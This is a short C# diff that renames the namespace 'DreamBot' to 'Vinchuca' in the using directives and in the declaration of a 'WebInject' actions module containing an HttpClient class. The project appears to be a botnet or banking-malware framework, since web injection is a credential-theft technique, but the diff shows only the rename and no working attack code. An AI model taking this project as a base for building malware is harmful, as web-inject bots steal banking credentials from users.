@@ -7,12 +7,12 @@ using System.Net.Sockets;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using DreamBot.Network;
-using DreamBot.Network.Comunication.TCP;
-using DreamBot.Utils;
-using TcpClient = DreamBot.Network.Comunication.TCP.TcpClient;
+using Vinchuca.Network;
+using Vinchuca.Network.Comunication.TCP;
+using Vinchuca.Utils;
+using TcpClient = Vinchuca.Network.Comunication.TCP.TcpClient;
 
-namespace DreamBot.Actions.WebInject
+namespace Vinchuca.Actions.WebInject
 {
     public class HttpClient
     {
